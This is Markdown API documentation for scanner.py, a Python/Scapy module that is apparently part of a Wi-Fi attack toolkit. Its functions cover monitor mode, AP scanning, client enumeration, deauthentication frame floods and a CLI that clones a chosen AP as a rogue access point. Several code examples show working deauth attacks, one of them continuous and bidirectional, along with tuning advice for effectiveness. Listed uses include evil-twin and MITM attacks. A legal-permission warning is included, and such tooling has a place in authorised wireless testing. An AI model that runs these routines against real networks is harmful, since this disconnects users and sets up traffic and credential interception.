# scanner.py - Wireless Scanning and Operations

## Overview

The `scanner.py` module provides low-level wireless network operations including AP discovery, client enumeration, deauthentication attacks, and monitor mode management. It uses Scapy for packet manipulation and Linux wireless tools for interface configuration.

## Dependencies

- `scapy` - Packet crafting and sniffing
- `subprocess` - System command execution
- `threading` - Channel hopping and async operations
- `pathlib` - File system operations
- Linux tools: `airmon-ng`, `iw`, `ip`, `iwconfig`

## Module-Level Functions

### Interface Utilities

#### `_iface_exists(name: str) -> bool`

**Purpose**: Check if a network interface exists

**Parameters**:
- `name` (str): Interface name (e.g., "wlan0", "wlan0mon")

**Returns**: `bool` - True if interface exists, False otherwise

**Implementation**:
- Uses `ip -o link show <name>` command
- Checks return code for existence
- Exception-safe (returns False on error)

**Example**:
```python
if _iface_exists("wlan0"):
    print("Interface found")
```

---

#### `_iface_mac(name: str) -> str`

**Purpose**: Get MAC address of a network interface

**Parameters**:
- `name` (str): Interface name

**Returns**: `str` - MAC address in lowercase (e.g., "aa:bb:cc:dd:ee:ff"), empty string on error

**Implementation**:
- First tries reading from `/sys/class/net/{name}/address`
- Falls back to parsing `ip -o link show` output
- Validates format (17 chars, 5 colons)
- Returns lowercase normalized MAC

**Example**:
```python
mac = _iface_mac("wlan0")
print(f"Interface MAC: {mac}")
```

---

### Monitor Mode Management

#### `start_monitor_mode(interface="wlan0")`

**Purpose**: Enable monitor mode on a wireless interface

**Parameters**:
- `interface` (str): Base interface name (default: "wlan0")

**Side Effects**:
- Kills interfering processes (NetworkManager, wpa_supplicant)
- Creates monitor interface (typically `{interface}mon`)
- Sets interface to monitor mode

**Implementation**:
- Executes `airmon-ng check kill` to stop conflicting services
- Executes `airmon-ng start {interface}` to enable monitor mode
- Uses `subprocess.run()` with `check=True` (raises on failure)

**Raises**:
- `subprocess.CalledProcessError` if airmon-ng fails
- `FileNotFoundError` if airmon-ng not installed

**Example**:
```python
start_monitor_mode("wlan0")
# Monitor interface wlan0mon now available
```

---

#### `stop_monitor_mode(monitor_interface="wlan0mon")`

**Purpose**: Disable monitor mode and restore managed mode

**Parameters**:
- `monitor_interface` (str): Monitor interface name (default: "wlan0mon")

**Side Effects**:
- Stops monitor mode
- Restores managed mode
- Attempts to restart NetworkManager (soft-try)

**Implementation**:
- Checks if monitor interface exists using `_iface_exists()`
- If exists: runs `airmon-ng stop {monitor_interface}`
- If not exists: manually sets base interface to managed mode using `iw` and `ip` commands
- Attempts to restart NetworkManager via systemctl or service command
- All failures are suppressed (best-effort approach)

**Example**:
```python
stop_monitor_mode("wlan0mon")
# Interface restored to managed mode
```

---

### Access Point Scanning

#### `scan_aps(interface="wlan0mon", timeout=15, hop=True, channels=None, dwell=0.4, on_ap=None)`

**Purpose**: Scan for nearby access points and collect beacon metadata

**Parameters**:
- `interface` (str): Monitor mode interface name (default: "wlan0mon")
- `timeout` (int): Total scan duration in seconds (default: 15)
- `hop` (bool): Enable channel hopping (default: True)
- `channels` (list[int], optional): Specific channels to scan (default: 1-13 for 2.4GHz)
- `dwell` (float): Seconds to stay on each channel (default: 0.4)
- `on_ap` (callable, optional): Callback invoked with `(bssid, info_dict)` when AP discovered

**Returns**: `dict` - Mapping of BSSID (lowercase) to AP information dict:
```python
{
    'bssid': {
        'ssid': str,           # Network name
        'ies_hex': str,        # Vendor IEs (hex string, vendor-specific only)
        'channel': int,        # WiFi channel
        'beacon_int': int      # Beacon interval (ms)
    }
}
```

**Implementation**:
1. Defines packet handler that filters `Dot11Beacon` frames
2. Extracts SSID from `Dot11Elt` layer (ID=0)
3. Collects vendor-specific IEs (ID=221) in hex format
4. Parses channel from DS Parameter Set IE (ID=3)
5. Extracts beacon interval from `Dot11Beacon` layer
6. Deduplicates by BSSID (processes only first beacon per AP)
7. Optionally runs channel hopper in background thread
8. Uses Scapy `sniff()` for packet capture
9. Invokes `on_ap` callback if provided

**Channel Hopping**:
- Spawns daemon thread that cycles through channels
- Uses `iw dev {interface} set channel {ch}` (preferred)
- Falls back to `iwconfig {interface} channel {ch}`
- Sleeps `dwell` seconds between channel changes

**Example**:
```python
def ap_found(bssid, info):
    print(f"Found: {info['ssid']} on {bssid}")

aps = scan_aps("wlan0mon", timeout=30, on_ap=ap_found)
for bssid, info in aps.items():
    print(f"{bssid}: {info['ssid']} (Ch {info['channel']})")
```

**Notes**:
- Only vendor-specific IEs (ID=221) are included in `ies_hex`
- Deduplication prevents multiple beacons from same AP
- Monitor mode must be active before calling

---

### Client Enumeration

#### `scan_clients(ap_bssid, interface="wlan0mon", timeout=20, force_iface_bssid=False)`

**Purpose**: Enumerate client MAC addresses connected to a specific AP

**Parameters**:
- `ap_bssid` (str): Target AP BSSID (required)
- `interface` (str): Monitor interface name (default: "wlan0mon")
- `timeout` (int): Scan duration in seconds (default: 20)
- `force_iface_bssid` (bool): Use interface's own MAC as target (for local AP) (default: False)

**Returns**: `set` - Set of client MAC addresses (lowercase)

**Raises**:
- `ValueError` if `ap_bssid` is empty
- `RuntimeError` if no usable interface found

**Implementation**:
1. Validates and normalizes target BSSID
2. Resolves best interface to use (prefers monitor interface)
3. If `force_iface_bssid=True`, overrides target with interface's MAC
4. Defines packet handler that examines all Dot11 frames
5. Checks if target BSSID appears in addr1, addr2, addr3, or addr4
6. Collects all other MAC addresses from matching frames
7. Filters out broadcast (ff:ff:ff:ff:ff:ff) and target BSSID
8. For local APs, also queries associated stations via `iw dev {interface} station dump`
9. Uses Scapy `sniff()` for packet capture

**Example**:
```python
clients = scan_clients("aa:bb:cc:dd:ee:ff", "wlan0mon", timeout=30)
print(f"Found {len(clients)} clients:")
for client in clients:
    print(f"  - {client}")
```

**Use Cases**:
- Enumerate clients before MITM attack
- Verify AP is in use
- Identify targets for deauthentication
- Monitor local AP associations (with `force_iface_bssid=True`)

---

### Deauthentication Attacks

#### `send_deauth(ap_bssid, interface="wlan0mon", reason=7, count=1)`

**Purpose**: Send IEEE 802.11 deauthentication frames to an AP

**Parameters**:
- `ap_bssid` (str): Target AP BSSID (required)
- `interface` (str): Interface to send from (default: "wlan0mon")
- `reason` (int): Deauth reason code (default: 7 = Class 3 frame from non-associated STA)
- `count` (int): Number of frames to send (default: 1)

**Returns**: `str` - Interface name used for sending

**Raises**:
- `ValueError` if BSSID is invalid (not 17 chars with 5 colons)
- `RuntimeError` if no usable interface found

**Implementation**:
1. Validates BSSID format
2. Resolves best interface (prefers monitor mode)
3. Constructs deauth frame:
   - RadioTap header
   - Dot11 layer with addr1=broadcast, addr2=AP, addr3=AP
   - Dot11Deauth with specified reason code
4. Sends using Scapy `sendp()` with 0.1s inter-frame delay

**Frame Structure**:
```python
RadioTap() / 
Dot11(
    addr1="ff:ff:ff:ff:ff:ff",  # Broadcast
    addr2=ap_bssid,              # Source (AP)
    addr3=ap_bssid               # BSSID
) / 
Dot11Deauth(reason=reason)
```

**Example**:
```python
# Send 5 deauth frames
send_deauth("aa:bb:cc:dd:ee:ff", count=5)
```

**Common Reason Codes**:
- 1: Unspecified reason
- 2: Previous authentication no longer valid
- 3: Deauthenticated because sending STA is leaving
- 7: Class 3 frame received from non-associated STA

---

#### `deauth_all(ap_bssid, interface="wlan0mon", channel=None, reason=7, pps=30, refresh_interval=15, client_scan_timeout=6, include_broadcast=True, stop_event=None, log=None)`

**Purpose**: Continuously deauthenticate all clients of an AP until stopped

**Parameters**:
- `ap_bssid` (str): Target AP BSSID (required)
- `interface` (str): Interface to use (default: "wlan0mon")
- `channel` (int, optional): Set interface to specific channel
- `reason` (int): Deauth reason code (default: 7)
- `pps` (int): Target packets per second (default: 30)
- `refresh_interval` (int): Seconds between client list refreshes (default: 15)
- `client_scan_timeout` (int): Seconds to scan for clients each refresh (default: 6)
- `include_broadcast` (bool): Send broadcast deauth frames (default: True)
- `stop_event` (threading.Event, optional): Event to signal stop
- `log` (callable, optional): Logging callback for status messages

**Returns**: None (runs until `stop_event` is set)

**Raises**:
- `ValueError` if BSSID is invalid or interface is empty
- `RuntimeError` if no usable interface found

**Implementation**:
1. Validates parameters and resolves interface
2. Sets interface to target channel if specified
3. Builds broadcast deauth frame (reused if `include_broadcast=True`)
4. Enters main loop:
   - Every `refresh_interval` seconds: refreshes client list via `scan_clients()`
   - Constructs deauth frames for each client (bidirectional):
     - AP → Client
     - Client → AP
   - Sends frames in bursts to approximate `pps` rate
   - Sleeps 0.25s between bursts
5. Continues until `stop_event.is_set()` returns True
6. Logs progress via `log()` callback or stdout

**Frame Types Sent**:
1. Broadcast: AP → ff:ff:ff:ff:ff:ff (if `include_broadcast=True`)
2. Per-client unicast: AP → Client
3. Per-client reverse: Client → AP

**Example**:
```python
import threading

stop = threading.Event()

def logger(msg):
    print(f"[DEAUTH] {msg}")

# Run in background thread
thread = threading.Thread(
    target=deauth_all,
    args=("aa:bb:cc:dd:ee:ff",),
    kwargs={
        'channel': 6,
        'pps': 50,
        'stop_event': stop,
        'log': logger
    }
)
thread.start()

# ... do other work ...

# Stop the attack
stop.set()
thread.join()
```

**Use Cases**:
- Force clients to disconnect from rogue AP
- Test client resilience to deauth attacks
- Facilitate evil twin attacks by disrupting legitimate AP

**Performance Notes**:
- `pps=30` is moderate (conservative)
- Higher PPS increases effectiveness but may violate regulations
- Bidirectional frames improve success rate

---

### Internal Utilities

#### `_set_channel(interface, channel)`

**Purpose**: Set interface to a specific WiFi channel

**Parameters**:
- `interface` (str): Interface name
- `channel` (int): Channel number (1-13 for 2.4GHz, 36-165 for 5GHz)

**Returns**: `bool` - True if command was issued successfully, False otherwise

**Implementation**:
- Tries `iw dev {interface} set channel {channel}` (modern)
- Falls back to `iwconfig {interface} channel {channel}` (legacy)
- Suppresses all errors (returns False on failure)

**Example**:
```python
if _set_channel("wlan0mon", 6):
    print("Channel set successfully")
```

---

## Main Script Behavior

When run as `__main__`, `scanner.py` executes an interactive CLI workflow:

1. Calls `show_interfaces()` (assumes this function exists, likely imported)
2. Prompts for interface name (e.g., "wlan0")
3. Prompts for upstream interface for NAT (e.g., "eth0")
4. Starts monitor mode on interface
5. Scans for APs using `scan_aps()`
6. Displays results in table format
7. Stops monitor mode
8. Prompts user to select AP BSSID for cloning
9. Prompts for passphrase for rogue AP
10. Starts rogue AP using `start_ap()` from `ap_manager` module
11. Preserves beacon IEs and interval from selected AP
12. Enters interactive command loop:
    - `status`: Show process status
    - `logs`: Reference to journalctl
    - `help`: List commands
    - `quit`: Stop and exit
13. On exit, stops rogue AP and cleans up

**Example Session**:
```
$ sudo python3 scanner.py
============== Wi-Fi Access Point Scanner ==============
Enter your interface name (e.g., wlan0): wlan0
Enter your upstream interface name (e.g., eth0): eth0
Starting monitor mode on wlan0...
Scanning for Access Points on wlan0mon for 15 seconds...
Access Points found:
BSSID: aa:bb:cc:dd:ee:ff, SSID: TargetNetwork, channel: 6
Enter the BSSID of the AP to clone: aa:bb:cc:dd:ee:ff
Enter the passphrase for the rogue AP: password123
AP should be up. Use stop() to terminate and cleanup.
Type "quit" or press Ctrl+C to stop the rogue AP and cleanup.
> status
hostapd: running, dnsmasq: running, tmpdir: /tmp/pyap_xyz, nat: True
> quit
AP stopped and cleaned up.
```

---

## Usage Examples

### Basic AP Scan
```python
from scanner import start_monitor_mode, scan_aps, stop_monitor_mode

start_monitor_mode("wlan0")
aps = scan_aps("wlan0mon", timeout=20)
stop_monitor_mode("wlan0mon")

for bssid, info in aps.items():
    print(f"{info['ssid']:20} {bssid} Ch{info['channel']}")
```

### Enumerate Clients
```python
from scanner import scan_clients

clients = scan_clients("aa:bb:cc:dd:ee:ff", "wlan0mon", timeout=30)
print(f"AP has {len(clients)} connected clients")
```

### Quick Deauth
```python
from scanner import send_deauth

send_deauth("aa:bb:cc:dd:ee:ff", count=10, reason=7)
```

### Continuous Deauth Attack
```python
import threading
from scanner import deauth_all

stop_event = threading.Event()

thread = threading.Thread(
    target=deauth_all,
    args=("aa:bb:cc:dd:ee:ff",),
    kwargs={
        'channel': 6,
        'pps': 40,
        'stop_event': stop_event,
        'include_broadcast': True
    }
)
thread.daemon = True
thread.start()

input("Press Enter to stop attack...")
stop_event.set()
thread.join()
```

---

## Security and Legal Considerations

⚠️ **WARNING**: This module contains functions that:
- Disrupt wireless networks (deauthentication)
- Create rogue access points (impersonation)
- Intercept network traffic

**Legal Requirements**:
- Only use on networks you own or have written permission to test
- Deauthentication attacks may be illegal under laws like:
  - US: Computer Fraud and Abuse Act (CFAA)
  - EU: Directive 2013/40/EU
  - Other jurisdictions: Various cybercrime and telecommunications laws

**Ethical Guidelines**:
- Always obtain explicit permission
- Test in isolated lab environments
- Document all testing activities
- Report findings responsibly

---

## Troubleshooting

### Monitor Mode Issues
```python
# If airmon-ng fails, try manual method:
import subprocess
subprocess.run(["sudo", "ip", "link", "set", "wlan0", "down"])
subprocess.run(["sudo", "iw", "wlan0", "set", "monitor", "none"])
subprocess.run(["sudo", "ip", "link", "set", "wlan0", "up"])
```

### No APs Detected
- Verify monitor mode: `iw dev`
- Check channels being scanned
- Increase timeout duration
- Try manual channel setting

### Deauth Not Working
- Ensure monitor mode is active
- Verify target BSSID is correct
- Try higher `count` or `pps` values
- Check if interface supports packet injection: `aireplay-ng -9 wlan0mon`

---

## Performance Optimization

1. **Scan Speed**: Reduce `dwell` time for faster channel hopping
2. **Client Detection**: Increase `timeout` for more complete results
3. **Deauth Effectiveness**: Balance `pps` (higher = more effective but louder)
4. **Resource Usage**: Use `store=0` in Scapy sniff to avoid memory buildup

---

## Related Modules

- **ap_manager.py**: Uses scanner functions for AP creation
- **mitm_attack.py**: Leverages scanner for target selection and monitoring
- **gui.py**: Provides GUI wrapper around scanner functions
- **client_detector.py**: Analyzes scan results for rogue AP detection
